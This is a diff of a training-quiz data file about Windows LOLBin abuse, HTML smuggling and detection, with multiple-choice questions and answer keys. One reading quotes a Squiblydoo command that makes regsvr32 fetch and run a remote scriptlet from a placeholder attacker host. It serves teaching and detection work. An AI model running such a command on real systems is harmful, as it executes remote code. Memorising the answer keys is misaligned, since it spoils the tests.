@@ -137,7 +137,7 @@ export const roomsBatch49 = [
             "Because allowlisting blocks only files carrying a Mark-of-the-Web flag, and built-in Windows binaries never arrive with that download flag set"
           ],
           "answer": 0,
-          "explanation": "This reading states the mechanism directly: the LOLBin is genuinely the approved file, and the malicious content is carried as an argument, a scriptlet, or a fetched payload rather than as the binary being evaluated. The signature idea confuses allowlisting with signature-checking — the fetched scriptlet is not covered by the binary’s Microsoft signature, so “the scriptlet is signed along with the binary” is wrong. LOLBins run at the caller’s own integrity level, not automatically as SYSTEM, and allowlisting applies regardless of privilege, so the SYSTEM-exemption claim is wrong. Mark-of-the-Web is a download tag unrelated to how allowlisting decides what may run, so that option conflates two separate controls."
+          "explanation": "This reading states the mechanism directly: the LOLBin is genuinely the approved file, and the malicious content is carried as an argument, a scriptlet, or a fetched payload rather than as the binary being evaluated. The signature idea confuses allowlisting with signature-checking: the fetched scriptlet is not covered by the binary’s Microsoft signature, so “the scriptlet is signed along with the binary” is wrong. LOLBins run at the caller’s own integrity level, not automatically as SYSTEM, and allowlisting applies regardless of privilege, so the SYSTEM-exemption claim is wrong. Mark-of-the-Web is a download tag unrelated to how allowlisting decides what may run, so that option conflates two separate controls."
         },
         "xp": 5
       },
@@ -149,13 +149,13 @@ export const roomsBatch49 = [
         "checkpoint": {
           "question": "Per this reading, what specifically does a secure email gateway or web proxy see when an HTML-smuggled attachment crosses the network, and why does that matter?",
           "options": [
-            "It sees only an ordinary HTML document with script — a low-risk MIME type — because the payload file is assembled from a decoded Blob in the browser only after the page has passed the inspection point",
+            "It sees only an ordinary HTML document with script, a low-risk MIME type, because the payload file is assembled from a decoded Blob in the browser only after the page has passed the inspection point",
             "It sees the fully formed payload file as it will land on disk, but gateways do not scan container formats such as ISO or ZIP by default, which this reading names as the real gap",
             "It sees an encrypted TLS session it cannot read, which this reading gives as the single reason the technique succeeds against every gateway configuration",
             "It sees a Mark-of-the-Web flag on the HTML file itself, which this reading says is what suppresses the gateway’s scanning of that message"
           ],
           "answer": 0,
-          "explanation": "This reading is explicit: the network-crossing artifact is an ordinary HTML document with script, not a recognizable payload file type — the payload only becomes a file locally, in the browser, after the network chokepoint. The container-scanning option is wrong because the gateway never receives a container file at all to scan; the point is that nothing file-shaped crosses the wire, not that ISO/ZIP scanning is skipped. TLS encryption is not the mechanism this reading describes, so the “undecryptable TLS” explanation is invented. Mark-of-the-Web is a Windows download tag relevant after a file lands on disk, not something that suppresses gateway inspection, so that option confuses the two layers this reading separates."
+          "explanation": "This reading is explicit: the network-crossing artifact is an ordinary HTML document with script, not a recognizable payload file type, the payload only becomes a file locally, in the browser, after the network chokepoint. The container-scanning option is wrong because the gateway never receives a container file at all to scan; the point is that nothing file-shaped crosses the wire, not that ISO/ZIP scanning is skipped. TLS encryption is not the mechanism this reading describes, so the “undecryptable TLS” explanation is invented. Mark-of-the-Web is a Windows download tag relevant after a file lands on disk, not something that suppresses gateway inspection, so that option confuses the two layers this reading separates."
         },
         "xp": 5
       },
@@ -167,10 +167,10 @@ export const roomsBatch49 = [
         "checkpoint": {
           "question": "Per this reading, at which specific stage of the NOBELIUM chain does System Binary Proxy Execution (a LOLBin) first appear, and which binary is it?",
           "options": [
-            "Stage 3, NativeZone — Microsoft’s write-up states this loader is run through rundll32.exe, the first point where a trusted signed binary proxies the code",
-            "Stage 1, EnvyScout — the HTML file is run through mshta.exe, which this reading gives as the first trusted-binary proxy step in the chain",
-            "Stage 2, BoomBox — the downloader is launched through regsvr32.exe before it profiles the host, according to this reading",
-            "Stage 4, VaporRage — the in-memory downloader runs through msiexec.exe, which this reading names as the first proxy-execution step"
+            "Stage 3, NativeZone, Microsoft’s write-up states this loader is run through rundll32.exe, the first point where a trusted signed binary proxies the code",
+            "Stage 1, EnvyScout: the HTML file is run through mshta.exe, which this reading gives as the first trusted-binary proxy step in the chain",
+            "Stage 2, BoomBox: the downloader is launched through regsvr32.exe before it profiles the host, according to this reading",
+            "Stage 4, VaporRage: the in-memory downloader runs through msiexec.exe, which this reading names as the first proxy-execution step"
           ],
           "answer": 0,
           "explanation": "This reading states it directly: NativeZone (Stage 3) is loaded and run through rundll32.exe, and that is where System Binary Proxy Execution first enters the chain. EnvyScout (Stage 1) is an HTML file opened by the browser, not run through mshta.exe, so that option is invented. BoomBox (Stage 2) is described as a downloader that profiles the host and exfiltrates to Dropbox, with no regsvr32.exe role, so that option is invented. VaporRage (Stage 4) is a shellcode downloader, not something launched through msiexec.exe, and it comes after Stage 3, so it cannot be the first proxy step."
@@ -191,7 +191,7 @@ export const roomsBatch49 = [
             "A 2022 Windows update removed the Office applications’ scripting engine entirely, leaving smuggled HTML as the only remaining way to run embedded code"
           ],
           "answer": 0,
-          "explanation": "This reading names the cause directly: Microsoft’s default macro-blocking change closed off the prior delivery route, and container files followed by HTML Smuggling filled the gap. Gateways did not begin stripping all Office attachments — ordinary documents still flow through mail — so that option overstates the change. The macro-block was a default on internet-sourced documents, not a hardware-level ban on all macros on new devices, so that option misstates the scope. No update removed the Office scripting engine; macros still run, they are just blocked by default when the file came from the internet, so that option is invented."
+          "explanation": "This reading names the cause directly: Microsoft’s default macro-blocking change closed off the prior delivery route, and container files followed by HTML Smuggling filled the gap. Gateways did not begin stripping all Office attachments (ordinary documents still flow through mail) so that option overstates the change. The macro-block was a default on internet-sourced documents, not a hardware-level ban on all macros on new devices, so that option misstates the scope. No update removed the Office scripting engine; macros still run, they are just blocked by default when the file came from the internet, so that option is invented."
         },
         "xp": 5
       },
@@ -217,7 +217,7 @@ export const roomsBatch49 = [
         "checkpoint": {
           "question": "Per this reading, why does T1127 (Trusted Developer Utilities Proxy Execution) carry TWO tactics at once, while T1218 (System Binary Proxy Execution) carries only Defense Evasion?",
           "options": [
-            "Running code through a developer tool is at once how the code executes (TA0002) and how it blends in as a routine build/debug process (TA0005) — a dual purpose T1218 shares but is not formally tagged for",
+            "Running code through a developer tool is at once how the code executes (TA0002) and how it blends in as a routine build/debug process (TA0005): a dual purpose T1218 shares but is not formally tagged for",
             "T1127 covers newer binaries than T1218 does, and MITRE assigns two tactics to any technique added to the framework after a certain release to mark it as recently documented",
             "T1218’s sub-techniques are detected only by endpoint tools while T1127’s are detected only on the network, and MITRE assigns tactic counts according to where a technique is detected",
             "T1127 requires local administrator rights whereas T1218’s sub-techniques do not, and MITRE doubles the tactic count of any technique that needs elevated privileges to run at all"
@@ -235,13 +235,13 @@ export const roomsBatch49 = [
         "checkpoint": {
           "question": "Per this reading, when mshta.exe runs with a script-protocol argument (a javascript: or vbscript: prefix) that pulls a remote .sct scriptlet from a URL, what makes it identifiable as abuse rather than ordinary HTA usage?",
           "options": [
-            "The command line itself — a script-protocol prefix paired with a remote URL fetching a scriptlet — rather than the ordinary pattern of naming a local .hta file path",
+            "The command line itself (a script-protocol prefix paired with a remote URL fetching a scriptlet) rather than the ordinary pattern of naming a local .hta file path",
             "The process name mshta.exe on its own, since a legitimate internal HTA tool would always launch mshta.exe under a different, renamed executable instead",
             "The medium integrity level of the process, since this reading states a genuine HTA invocation always runs at high integrity and abuse always runs lower",
             "The parent process being explorer.exe, since this reading states a legitimate HTA is only ever launched directly by the Windows service host, never by the shell"
           ],
           "answer": 0,
-          "explanation": "This reading’s closing point is exactly this: the command line — a script-protocol prefix plus a remote URL — is the tell, not the process name, because mshta.exe itself is a legitimate, signed Windows component that also runs ordinary local HTA files. Filtering on the process name alone cannot separate the two, and a legitimate tool does not run under a renamed copy of mshta.exe, so that option is wrong. Integrity level does not distinguish them — a legitimate HTA runs at the launching user’s integrity, commonly medium — so that option is invented. explorer.exe is the normal parent of anything a user opens, so it is not what marks the command as abuse, making that option wrong as well."
+          "explanation": "This reading’s closing point is exactly this: the command line (a script-protocol prefix plus a remote URL) is the tell, not the process name, because mshta.exe itself is a legitimate, signed Windows component that also runs ordinary local HTA files. Filtering on the process name alone cannot separate the two, and a legitimate tool does not run under a renamed copy of mshta.exe, so that option is wrong. Integrity level does not distinguish them (a legitimate HTA runs at the launching user’s integrity, commonly medium) so that option is invented. explorer.exe is the normal parent of anything a user opens, so it is not what marks the command as abuse, making that option wrong as well."
         },
         "xp": 5
       },
@@ -251,7 +251,7 @@ export const roomsBatch49 = [
         "heading": "Regsvr32.exe and \"Squiblydoo\": Scriptlets Instead of DLLs (T1218.010)",
         "content": "`regsvr32.exe` is a legitimate Windows utility for registering and unregistering **COM (Component Object Model) DLLs** -- shared code libraries that other Windows applications can call into by a standard interface, rather than each writing their own version of common functionality. Normal, everyday use looks like `regsvr32.exe /s C:\\Program Files\\SomeApp\\plugin.dll`, run automatically by countless software installers immediately after copying a new DLL into place.\n\n### \"Squiblydoo\": Loading a Scriptlet From a URL, With No DLL At All\n\nSecurity researcher Casey Smith documented a specific abuse pattern, nicknamed **Squiblydoo**, that many defenders still call it by today: `regsvr32.exe /s /n /u /i:http://attacker-host/payload.sct scrobj.dll`. Here, `/i:URL` tells `regsvr32.exe` to fetch a COM **scriptlet** (a `.sct` file, containing VBScript or JScript) from that URL and pass it to `scrobj.dll` -- a real, legitimate, Microsoft-signed Windows component (the Windows Script Component runtime) -- for execution; `/u` and `/n` together mean *unregister, and skip the normal DLL-registration entry point*. The result: `regsvr32.exe`'s network-aware fetch capability retrieves and runs a remote script, and because nothing is actually being registered in the traditional sense, this technique leaves **no persistent registry trace of a DLL registration at all** -- making it, by design, harder to find after the fact than the everyday installer usage it mimics.\n\n### Real-World Groups Documented Using This Technique\n\nMITRE ATT&CK's procedure examples for `T1218.010` include: **APT32** (a Vietnam-linked actor), which used `regsvr32.exe` to execute COM scriptlets that downloaded backdoors; **Cobalt Group**, a financially-motivated actor targeting banks, which used it to execute scripts; **Emotet** and **QakBot**, both widespread malware-delivery families, which use `regsvr32.exe` to execute malicious DLL payloads; **Lazarus Group**, which used it during the well-documented \"Operation Dream Job\" campaign; and **Storm-0501**, a ransomware-affiliated actor, which has used `regsvr32.exe` to launch Cobalt Strike Beacon files.\n\n### The Discriminator: Is There a Local DLL, or a Remote URL?\n\nThe distinction that matters to an analyst is structural, not subtle once named: a legitimate installer-driven registration names a **local file path** to a DLL that was just placed on disk moments earlier, usually as a child process of the installer (`msiexec.exe` or a vendor-specific setup executable). The Squiblydoo pattern names a **remote URL**, references `scrobj.dll` explicitly rather than the application's own DLL, and typically appears with no corresponding software installation having just occurred on the host at all. This room's log-analysis and analyst-choice tasks, later in this room, are both built directly around telling these two shapes apart from a real command line.",
         "checkpoint": {
-          "question": "Per this reading, when regsvr32.exe is run in the Squiblydoo pattern — the /i: flag pointed at a remote URL together with scrobj.dll — what does that cause it to do, and why does it leave no persistent registry trace of a DLL registration?",
+          "question": "Per this reading, when regsvr32.exe is run in the Squiblydoo pattern, the /i: flag pointed at a remote URL together with scrobj.dll. What does that cause it to do, and why does it leave no persistent registry trace of a DLL registration?",
           "options": [
             "It fetches a COM scriptlet from the URL and hands it to scrobj.dll for execution, and because the flags skip normal registration, no DLL-registration entry is written to the registry",
             "It registers a new DLL under a hidden registry key, but Windows automatically purges that key at the next reboot, which is why no trace is left behind for an analyst to find",
@@ -259,7 +259,7 @@ export const roomsBatch49 = [
             "It loads the application’s own local DLL from disk but records the registration only in volatile memory, so the entry disappears the moment the regsvr32.exe process exits"
           ],
           "answer": 0,
-          "explanation": "This reading states the mechanism directly: the /i:URL flag fetches a scriptlet and hands it to scrobj.dll for execution, and the skip-registration flags mean nothing is genuinely registered, which is exactly why no persistent DLL-registration trace is left. The “hidden key purged at reboot” option is invented — no registration happens at all, so nothing is created to purge. The scriptlet is not written into a Run key, and registry values are not hidden from standard tools this way, so that option is invented. The pattern references a remote scriptlet and scrobj.dll, not the application’s own local DLL, so the “local DLL recorded in memory” option is wrong."
+          "explanation": "This reading states the mechanism directly: the /i:URL flag fetches a scriptlet and hands it to scrobj.dll for execution, and the skip-registration flags mean nothing is genuinely registered, which is exactly why no persistent DLL-registration trace is left. The “hidden key purged at reboot” option is invented: no registration happens at all, so nothing is created to purge. The scriptlet is not written into a Run key, and registry values are not hidden from standard tools this way, so that option is invented. The pattern references a remote scriptlet and scrobj.dll, not the application’s own local DLL, so the “local DLL recorded in memory” option is wrong."
         },
         "xp": 5
       },
@@ -285,7 +285,7 @@ export const roomsBatch49 = [
         "checkpoint": {
           "question": "Per this reading, what real-world detail from this room's earlier NOBELIUM reading does the rundll32.exe abuse pattern connect back to?",
           "options": [
-            "NativeZone, the Stage-3 loader in the NOBELIUM chain, which Microsoft’s write-up states is run through rundll32.exe — exactly the DLL-function proxy pattern this reading describes",
+            "NativeZone, the Stage-3 loader in the NOBELIUM chain, which Microsoft’s write-up states is run through rundll32.exe: exactly the DLL-function proxy pattern this reading describes",
             "EnvyScout, the Stage-1 HTML dropper, which this reading now says was run through rundll32.exe rather than being opened directly by the victim’s browser",
             "BoomBox, the Stage-2 downloader, which this reading states uploaded its stolen data to Dropbox using rundll32.exe as its network transport mechanism",
             "VaporRage, the Stage-4 shellcode downloader, which this reading states is a renamed copy of rundll32.exe rather than its own distinct component"
@@ -390,7 +390,7 @@ export const roomsBatch49 = [
             "TrustedInstaller.exe spawning mshta.exe, which this reading states is the common parent seen during ordinary Windows Update servicing operations"
           ],
           "answer": 0,
-          "explanation": "This reading names this exact chain — an Office application spawning mshta.exe, typically via a malicious macro — as one of the most common real-world deployments of this technique. svchost.exe, lsass.exe, and TrustedInstaller.exe spawning mshta.exe are not patterns this reading describes; each of those options attaches a fabricated, plausible-sounding routine to a parent-child pair the reading never names, so all three are invented."
+          "explanation": "This reading names this exact chain: an Office application spawning mshta.exe, typically via a malicious macro, as one of the most common real-world deployments of this technique. svchost.exe, lsass.exe, and TrustedInstaller.exe spawning mshta.exe are not patterns this reading describes; each of those options attaches a fabricated, plausible-sounding routine to a parent-child pair the reading never names, so all three are invented."
         },
         "xp": 5
       },
@@ -455,7 +455,7 @@ export const roomsBatch49 = [
               "winlog.event_data.Signature reads Microsoft Windows and SignatureStatus is Valid, so the binary is trusted and the event can be closed without reading the command line"
             ],
             "answer": 0,
-            "explanation": "This room’s regsvr32 reading names exactly this pairing: the /i: flag at a remote URL with scrobj.dll as the target, together with the absence of any installer ancestry, is the Squiblydoo shape. The Downloads CurrentDirectory is suggestive context but not the identifier on its own — benign downloads also run from there — so that option over-weights location. explorer.exe is the normal parent of anything a user opens, so the parent alone does not confirm abuse; it is the command line that carries the remote source, making that option wrong. The Valid Microsoft signature is expected here — regsvr32.exe genuinely is signed — so treating it as grounds to close the event inverts this room’s central point.",
+            "explanation": "This room’s regsvr32 reading names exactly this pairing: the /i: flag at a remote URL with scrobj.dll as the target, together with the absence of any installer ancestry, is the Squiblydoo shape. The Downloads CurrentDirectory is suggestive context but not the identifier on its own (benign downloads also run from there) so that option over-weights location. explorer.exe is the normal parent of anything a user opens, so the parent alone does not confirm abuse; it is the command line that carries the remote source, making that option wrong. The Valid Microsoft signature is expected here. Regsvr32.exe genuinely is signed, so treating it as grounds to close the event inverts this room’s central point.",
             "xp": 20
           },
           {
@@ -467,7 +467,7 @@ export const roomsBatch49 = [
               "Block the hash of regsvr32.exe across the entire fleet in the EDR so that this binary can no longer launch on any managed workstation anywhere in the environment going forward"
             ],
             "answer": 0,
-            "explanation": "This room’s detection reading is explicit that outbound network activity following a proxy-execution pattern is a key corroborating signal, visible in proxy, firewall and DNS logs — exactly the pivot described here, paired with isolating the host as reasonable containment while that pivot runs. Closing it as a false positive on the strength of the Microsoft signature repeats the misunderstanding this room corrects throughout. Reimaging before collecting the URL and network evidence is the right action at the wrong time: it destroys the forensic trail the pivot needs. Blocking the hash of regsvr32.exe would stop a legitimate, constantly used Windows component and break normal operations, so that option is wrong.",
+            "explanation": "This room’s detection reading is explicit that outbound network activity following a proxy-execution pattern is a key corroborating signal, visible in proxy, firewall and DNS logs: exactly the pivot described here, paired with isolating the host as reasonable containment while that pivot runs. Closing it as a false positive on the strength of the Microsoft signature repeats the misunderstanding this room corrects throughout. Reimaging before collecting the URL and network evidence is the right action at the wrong time: it destroys the forensic trail the pivot needs. Blocking the hash of regsvr32.exe would stop a legitimate, constantly used Windows component and break normal operations, so that option is wrong.",
             "xp": 20
           }
         ]
@@ -486,7 +486,7 @@ export const roomsBatch49 = [
             "Without it, the rule can only run on a fixed daily schedule, because this reading states parent-process exclusions are what let a correlation rule run more frequently"
           ],
           "answer": 0,
-          "explanation": "This reading states the reasoning directly: the exclusion filters out routine installer-driven cases that would otherwise flood the rule and risk alert fatigue. The installer is not a required parent for malicious cases — it is the routine, legitimate parent the rule is designed to exclude — so that option inverts the reading’s point. The pseudocode is valid and has no such operator dependency, so the “query fails to run” option is invented. Run frequency has nothing to do with parent-process exclusions here, so the “fixed daily schedule” option is invented."
+          "explanation": "This reading states the reasoning directly: the exclusion filters out routine installer-driven cases that would otherwise flood the rule and risk alert fatigue. The installer is not a required parent for malicious cases (it is the routine, legitimate parent the rule is designed to exclude) so that option inverts the reading’s point. The pseudocode is valid and has no such operator dependency, so the “query fails to run” option is invented. Run frequency has nothing to do with parent-process exclusions here, so the “fixed daily schedule” option is invented."
         },
         "xp": 5
       },
